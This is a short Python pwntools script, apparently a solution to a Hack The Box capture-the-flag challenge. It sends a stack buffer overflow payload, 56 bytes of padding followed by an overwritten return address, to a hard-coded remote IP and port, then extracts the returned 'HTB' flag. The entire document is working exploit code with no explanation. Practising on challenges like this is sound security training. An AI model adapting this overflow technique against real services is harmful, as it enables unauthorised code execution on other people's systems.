from pwn import *

address = '94.237.62.211'
port = 44365

payload = b'A' * 56
payload += b'\xb7\x16\x40\x00\x00\x00\x00\x00'

with remote(address, port) as target:
	target.recvuntil(b'>')
	target.sendline(payload)
	flag = target.recvuntil(b'}').decode()
	print(flag[flag.index('HTB'):flag.index('}') + 1])
